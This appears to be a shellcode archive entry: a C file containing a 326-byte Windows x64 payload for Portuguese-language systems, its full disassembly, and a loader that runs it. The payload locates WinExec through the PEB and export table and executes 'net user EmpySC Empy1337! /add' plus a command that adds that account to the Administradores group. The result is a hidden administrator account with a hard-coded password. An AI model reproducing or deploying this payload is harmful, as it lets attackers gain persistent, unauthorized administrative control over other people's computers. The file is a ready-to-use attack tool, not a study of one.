/*
# Name: Windows/x64 (Brazil) - Add Administradores User (EmpySC/Empy1337!)
/ Dynamic PEB & EDT method Shellcode (326 bytes)
# Author: Mr Empy
# Website: https://mrempy.github.io/ | https://amoloht.github.io/
# Tested on: Microsoft Windows Version 10.0.19045
# Shellcode Length: 326

Command: cmd.exe /c net user EmpySC Empy1337! /add && net localgroup
Administradores EmpySC /add

Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 31 ff                xor    %rdi,%rdi
   3:   48 f7 e7                mul    %rdi
   6:   65 48 8b 58 60          mov    %gs:0x60(%rax),%rbx
   b:   48 8b 5b 18             mov    0x18(%rbx),%rbx
   f:   48 8b 5b 20             mov    0x20(%rbx),%rbx
  13:   48 8b 1b                mov    (%rbx),%rbx
  16:   48 8b 1b                mov    (%rbx),%rbx
  19:   48 8b 5b 20             mov    0x20(%rbx),%rbx
  1d:   49 89 d8                mov    %rbx,%r8
  20:   8b 5b 3c                mov    0x3c(%rbx),%ebx
  23:   4c 01 c3                add    %r8,%rbx
  26:   48 31 c9                xor    %rcx,%rcx
  29:   66 81 c1 ff 88          add    $0x88ff,%cx
  2e:   48 c1 e9 08             shr    $0x8,%rcx
  32:   8b 14 0b                mov    (%rbx,%rcx,1),%edx
  35:   4c 01 c2                add    %r8,%rdx
  38:   4d 31 d2                xor    %r10,%r10
  3b:   44 8b 52 1c             mov    0x1c(%rdx),%r10d
  3f:   4d 01 c2                add    %r8,%r10
  42:   4d 31 db                xor    %r11,%r11
  45:   44 8b 5a 20             mov    0x20(%rdx),%r11d
  49:   4d 01 c3                add    %r8,%r11
  4c:   4d 31 e4                xor    %r12,%r12
  4f:   44 8b 62 24             mov    0x24(%rdx),%r12d
  53:   4d 01 c4                add    %r8,%r12
  56:   eb 32                   jmp    8a <.text+0x8a>
  58:   5b                      pop    %rbx
  59:   59                      pop    %rcx
  5a:   48 31 c0                xor    %rax,%rax
  5d:   48 89 e2                mov    %rsp,%rdx
  60:   51                      push   %rcx
  61:   48 8b 0c 24             mov    (%rsp),%rcx
  65:   48 31 ff                xor    %rdi,%rdi
  68:   41 8b 3c 83             mov    (%r11,%rax,4),%edi
  6c:   4c 01 c7                add    %r8,%rdi
  6f:   48 89 d6                mov    %rdx,%rsi
  72:   f3 a6                   repz cmpsb %es:(%rdi),%ds:(%rsi)
  74:   74 05                   je     7b <.text+0x7b>
  76:   48 ff c0                inc    %rax
  79:   eb e6                   jmp    61 <.text+0x61>
  7b:   59                      pop    %rcx
  7c:   66 41 8b 04 44          mov    (%r12,%rax,2),%ax
  81:   41 8b 04 82             mov    (%r10,%rax,4),%eax
  85:   4c 01 c0                add    %r8,%rax
  88:   53                      push   %rbx
  89:   c3                      ret
  8a:   48 31 c9                xor    %rcx,%rcx
  8d:   80 c1 07                add    $0x7,%cl
  90:   48 b8 0f a8 96 91 ba    movabs $0x9c9a87ba9196a80f,%rax
  97:   87 9a 9c
  9a:   48 f7 d0                not    %rax
  9d:   48 c1 e8 08             shr    $0x8,%rax
  a1:   50                      push   %rax
  a2:   51                      push   %rcx
  a3:   e8 b0 ff ff ff          call   58 <.text+0x58>
  a8:   49 89 c6                mov    %rax,%r14
  ab:   eb 0f                   jmp    bc <.text+0xbc>
  ad:   48 31 d2                xor    %rdx,%rdx
  b0:   48 83 ec 20             sub    $0x20,%rsp
  b4:   41 ff d6                call   *%r14
  b7:   48 83 c4 20             add    $0x20,%rsp
  bb:   c3                      ret
  bc:   48 b8 20 20 20 20 20    movabs $0x2020202020202020,%rax
  c3:   20 20 20
  c6:   48 c1 e8 06             shr    $0x6,%rax
  ca:   50                      push   %rax
  cb:   48 b8 20 20 20 20 20    movabs $0x2020202020202020,%rax
  d2:   20 20 20
  d5:   50                      push   %rax
  d6:   48 b8 53 43 20 2f 61    movabs $0x206464612f204353,%rax
  dd:   64 64 20
  e0:   50                      push   %rax
  e1:   48 b8 72 65 73 20 45    movabs $0x79706d4520736572,%rax
  e8:   6d 70 79
  eb:   50                      push   %rax
  ec:   48 b8 6e 69 73 74 72    movabs $0x6f6461727473696e,%rax
  f3:   61 64 6f
  f6:   50                      push   %rax
  f7:   48 b8 6f 75 70 20 41    movabs $0x696d64412070756f,%rax
  fe:   64 6d 69
 101:   50                      push   %rax
 102:   48 b8 20 6c 6f 63 61    movabs $0x72676c61636f6c20,%rax
 109:   6c 67 72
 10c:   50                      push   %rax
 10d:   48 b8 64 20 26 26 20    movabs $0x74656e2026262064,%rax
 114:   6e 65 74
 117:   50                      push   %rax
 118:   48 b8 33 33 37 21 20    movabs $0x64612f2021373333,%rax
 11f:   2f 61 64
 122:   50                      push   %rax
 123:   48 b8 53 43 20 45 6d    movabs $0x3179706d45204353,%rax
 12a:   70 79 31
 12d:   50                      push   %rax
 12e:   48 b8 73 65 72 20 45    movabs $0x79706d4520726573,%rax
 135:   6d 70 79
 138:   50                      push   %rax
 139:   48 b8 2f 63 20 6e 65    movabs $0x752074656e20632f,%rax
 140:   74 20 75
 143:   50                      push   %rax
 144:   48 b8 63 6d 64 2e 65    movabs $0x206578652e646d63,%rax
 14b:   78 65 20
 14e:   50                      push   %rax
 14f:   48 89 e1                mov    %rsp,%rcx
 152:   e8 56 ff ff ff          call   ad <.text+0xad>
 */

#include <stdio.h>
#include <windows.h>

unsigned char shellcode[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\xeb\x0f\x48\x31\xd2\x48\x83\xec\x20\x41\xff\xd6\x48\x83\xc4\x20\xc3\x48\xb8\x20\x20\x20\x20\x20\x20\x20\x20\x48\xc1\xe8\x06\x50\x48\xb8\x20\x20\x20\x20\x20\x20\x20\x20\x50\x48\xb8\x53\x43\x20\x2f\x61\x64\x64\x20\x50\x48\xb8\x72\x65\x73\x20\x45\x6d\x70\x79\x50\x48\xb8\x6e\x69\x73\x74\x72\x61\x64\x6f\x50\x48\xb8\x6f\x75\x70\x20\x41\x64\x6d\x69\x50\x48\xb8\x20\x6c\x6f\x63\x61\x6c\x67\x72\x50\x48\xb8\x64\x20\x26\x26\x20\x6e\x65\x74\x50\x48\xb8\x33\x33\x37\x21\x20\x2f\x61\x64\x50\x48\xb8\x53\x43\x20\x45\x6d\x70\x79\x31\x50\x48\xb8\x73\x65\x72\x20\x45\x6d\x70\x79\x50\x48\xb8\x2f\x63\x20\x6e\x65\x74\x20\x75\x50\x48\xb8\x63\x6d\x64\x2e\x65\x78\x65\x20\x50\x48\x89\xe1\xe8\x56\xff\xff\xff";

int main() {
	int sclen = strlen(shellcode);
	DWORD old = 0;
	HANDLE currentproc = GetCurrentProcess();
	PVOID memaddr;
	SIZE_T written;
	BOOL writescmem;
	HANDLE thread;

	printf("[*] Shellcode length: %d\n", sclen);

	VirtualProtect(shellcode, sclen, PAGE_EXECUTE_READWRITE, &old);

	memaddr = VirtualAllocEx(currentproc, NULL, sclen, (MEM_RESERVE |
		MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (memaddr) {
		puts("[+] Allocated virtual memory");
	}

	writescmem = WriteProcessMemory(currentproc, memaddr, shellcode, sclen,
		&written);
	if (writescmem) {
		printf("[+] Shellcode written to memory\n");
	}

	thread = CreateThread(NULL, 0, memaddr, NULL, 0, NULL);
	WaitForSingleObject(thread, INFINITE);

	return 0;
}